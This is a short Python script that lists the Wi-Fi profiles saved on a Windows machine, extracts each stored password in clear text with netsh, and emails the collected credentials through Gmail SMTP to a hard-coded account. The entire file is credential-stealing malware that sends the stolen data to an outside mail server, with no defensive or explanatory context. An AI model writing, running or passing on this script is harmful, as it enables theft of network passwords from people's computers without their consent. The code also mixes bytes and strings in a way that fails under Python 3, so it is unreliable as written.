import re
import smtplib
import subprocess

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell = True)
network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)

final_string = ""
for network_name in network_names:
    command = "netsh wlan show profile " + network_name + " key=clear"
    result = subprocess.check_output(command, shell = True)
    final_string += result

send_mail("email", "pass", final_string)
